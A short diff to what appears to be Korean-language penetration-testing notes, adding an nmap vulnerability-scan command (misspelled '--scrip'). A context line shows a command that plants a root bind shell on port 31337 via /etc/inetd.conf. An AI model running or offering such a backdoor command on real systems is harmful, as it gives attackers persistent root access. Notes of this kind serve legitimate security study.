@@ -17,3 +17,9 @@ echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
 ---
 # PHP
 - phpinfo.php 파일에서 경로 및 사용 가능 코드 확인
+---
+# NMAP
+```bash
+sudo nmap --scrip vuln <ip>
+```
+- 취약점을 찾기 어려울 때 nmap 실행해서 확인
